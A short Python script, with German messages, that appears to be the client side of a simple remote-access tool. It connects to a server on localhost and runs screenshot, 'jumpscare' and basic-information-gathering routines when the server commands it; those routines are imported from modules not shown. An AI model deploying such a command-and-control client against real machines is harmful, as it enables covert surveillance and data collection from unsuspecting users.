import socket
import threading
from GetBasicInformation import init_basic_information
from Jumpscare import init_jumpscare
from Screenshot import init_screenshot



def listen_for_commands(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if data:
                print(f"Befehl vom Server empfangen: {data}")
                if data == "JUMPSCARE":
                    init_jumpscare('Adsadsa')
                if data == "SCREENSHOT":
                    init_screenshot('Adsadsad')
                if data == "GETBASICINFORMATION":
                    init_basic_information('Asasad')
            else:
                break
        except:
            break

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = '127.0.0.1'
port = 12345

client_socket.connect((host, port))

listener_thread = threading.Thread(target=listen_for_commands, args=(client_socket,))
listener_thread.daemon = True
listener_thread.start()

message = "Hallo vom Client!"
client_socket.send(message.encode())

while True:
    pass
